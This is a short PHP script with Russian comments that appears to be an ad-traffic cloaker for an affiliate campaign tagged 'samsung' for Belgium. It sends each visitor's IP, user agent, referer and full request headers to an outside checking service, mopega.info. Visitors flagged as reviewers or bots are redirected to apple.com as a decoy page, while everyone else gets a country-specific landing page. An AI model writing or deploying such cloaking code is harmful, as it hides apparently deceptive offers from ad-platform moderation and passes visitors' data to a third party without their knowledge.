<?
 $subacc = 'valera_teidek_BE_samsung'; //увод в формате имя_домен_гео
 $fbp = ''; //пиксель фб
 $key = ''; //кей от бинома. В биноме заводить с названием увода
 
 $isCLO = false; // если без кло, то вписать false, с кло - true
 $uvod = 'https://www.apple.com/'; //url увода, если кло = true
 $countryName = 'be'; //Вписать гео: it, ca, be, nz, fr, au, uk

 //$post['ip'] = $_SERVER["REMOTE_ADDR"]; //раскоментить, если без клауда, следующую закоментить
 $post["ip"] = $_SERVER["HTTP_CF_CONNECTING_IP"]; //раскоментить, если с клаудом, предыдущую закоментить
 $post["domain"] = $_SERVER["HTTP_HOST"];
 $post["referer"] = @$_SERVER["HTTP_REFERER"];
 $post["user_agent"] = $_SERVER["HTTP_USER_AGENT"];
 $post["headers"] = json_encode(apache_request_headers());


 $curl = curl_init("https://mopega.info/api/check_ip");
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($curl, CURLOPT_TIMEOUT, 60);
 curl_setopt($curl, CURLOPT_POST, true);
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post);

 $json_reqest = curl_exec($curl);
 curl_close($curl);
 $api_reqest = json_decode($json_reqest);

if ($isCLO){

    if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
        header('Location: '. $uvod, true, 302);
     }else{
        require_once($countryName . "/index.php");
     }
} else {
    require_once($countryName . "/index.php");
}